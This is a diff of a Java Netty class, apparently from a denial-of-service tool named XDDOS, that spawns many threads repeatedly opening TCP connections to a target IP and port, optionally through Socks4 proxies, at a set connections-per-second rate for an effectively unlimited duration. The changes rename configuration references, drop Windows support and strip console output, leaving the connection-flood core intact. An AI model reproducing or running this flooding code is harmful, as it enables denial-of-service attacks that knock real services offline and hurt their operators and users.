@@ -10,10 +10,7 @@ import io.netty.channel.ChannelOption;
 import io.netty.channel.EventLoopGroup;
 import io.netty.channel.epoll.EpollEventLoopGroup;
 import io.netty.channel.epoll.EpollSocketChannel;
-import io.netty.channel.nio.NioEventLoopGroup;
-import io.netty.channel.socket.nio.NioSocketChannel;
 import io.netty.handler.proxy.Socks4ProxyHandler;
-import io.netty.handler.proxy.Socks5ProxyHandler;
 import io.netty.util.ResourceLeakDetector;
 import io.netty.util.concurrent.Future;
 import io.netty.util.concurrent.GenericFutureListener;
@@ -36,11 +33,11 @@ public class NettyBootstrap {
    public static volatile int totalSeconds = 0;
 
    static {
-      nettyThreads = Main.nettyThreads;
-      disableFailedProxies = true;
-      if (System.getProperty("os.name").toLowerCase().contains("win")) {
-         socketChannel = NioSocketChannel.class;
-         loopGroup = new NioEventLoopGroup(nettyThreads, new ThreadFactory() {
+      nettyThreads = XDDOS.nettyThreads;
+      disableFailedProxies = true; 
+      {
+         socketChannel = EpollSocketChannel.class;
+         loopGroup = new EpollEventLoopGroup(nettyThreads, new ThreadFactory() {
             public Thread newThread(Runnable r) {
                Thread t = new Thread(r);
                t.setDaemon(true);
@@ -48,20 +45,10 @@ public class NettyBootstrap {
                return t;
             }
          });
-      } else {
-         socketChannel = EpollSocketChannel.class;
-         loopGroup = new EpollEventLoopGroup(nettyThreads, new ThreadFactory() {
-            public Thread newThread(Runnable r) {
-               Thread t = new Thread(r);
-               t.setDaemon(true);
-               t.setPriority(5);
-               return t;
-            }
-         });
       }
 
-      method = Main.method;
-      proxyLoader = Main.proxies;
+      method = XDDOS.METHOD;
+      proxyLoader = XDDOS.proxies;
       channelHandler = new ChannelHandler() {
          public void handlerRemoved(ChannelHandlerContext arg0) throws Exception {
          }
@@ -109,48 +96,29 @@ public class NettyBootstrap {
       };
       bootstrap = (Bootstrap)((Bootstrap)((Bootstrap)((Bootstrap)((Bootstrap)(new Bootstrap()).channel(socketChannel)).group(loopGroup)).option(ChannelOption.TCP_NODELAY, true)).option(ChannelOption.AUTO_READ, false)).handler(handler);
    }
-
-
-   public static final String WHITE_BOLD = "\033[1;37m";  // WHITE
-   public static final String RESET = "\033[0m";
-   public static final String RED_BOLD = "\033[1;31m";    // RED
-   public static final String GREEN_BOLD = "\033[1;32m";  // GREEN
-   public static final String CYAN_BOLD = "\033[1;36m";   // CYAN
-   public static final String CYAN = "\033[0;36m";    // CYAN
-
    
    public static void start() throws Throwable {
       ResourceLeakDetector.setEnabled(true);
-      InetAddress ip = Main.resolved;
-      int port = Main.port;
+      InetAddress ip = XDDOS.resolved;
+      int port = XDDOS.port;
       new Thread(() -> {
-         if (Main.duration < 1) {
-            Main.duration = 2147483647;
+         if (XDDOS.duration < 1) {
+            XDDOS.duration = 2147483647;
          }
-         System.out.print(WHITE_BOLD+ "[" + RED_BOLD + "INFO" +WHITE_BOLD+"] CPS = connection per second\n"+WHITE_BOLD);
-         System.out.println();
-         System.out.println(WHITE_BOLD+"∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭\n");
 
-         for(int i = 0; i < Main.duration; ++i) {
+         for(int i = 0; i < XDDOS.duration; ++i) {
             try {
                Thread.sleep(1000L);
             } catch (InterruptedException var2) {
             }
-
             ++totalSeconds;
-            System.out.println(WHITE_BOLD+"》 "+RED_BOLD+"Current CPS -> "+GREEN_BOLD + integer + WHITE_BOLD+" |"+WHITE_BOLD+ "Target CPS -> " + GREEN_BOLD+ triedCPS + WHITE_BOLD+" |"+CYAN_BOLD+" Average CPS -> " +GREEN_BOLD+ Math.ceil((double)totalConnections / (double)totalSeconds)+RESET);
             integer = 0;
             triedCPS = 0;
          }
-         System.out.println();
-         System.out.println(WHITE_BOLD+"∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭∭");
-
-         System.out.println("Exit...");
-         System.exit(0);
       }).start();
       int k;
-      if (Main.targetCPS == -1) {
-         for(k = 0; k < Main.loopThreads; ++k) {
+      if (XDDOS.targetCPS == -1) {
+         for(k = 0; k < XDDOS.loopThreads; ++k) {
             (new Thread(() -> {
                while(true) {
                   ++triedCPS;
@@ -159,10 +127,10 @@ public class NettyBootstrap {
             })).start();
          }
       } else {
-         for(k = 0; k < Main.loopThreads; ++k) {
+         for(k = 0; k < XDDOS.loopThreads; ++k) {
             (new Thread(() -> {
                while(true) {
-                  for(int j = 0; j < Main.targetCPS / Main.loopThreads / 10; ++j) {
+                  for(int j = 0; j < XDDOS.targetCPS / XDDOS.loopThreads / 10; ++j) {
                      ++triedCPS;
                      bootstrap.connect(ip, port);
                   }
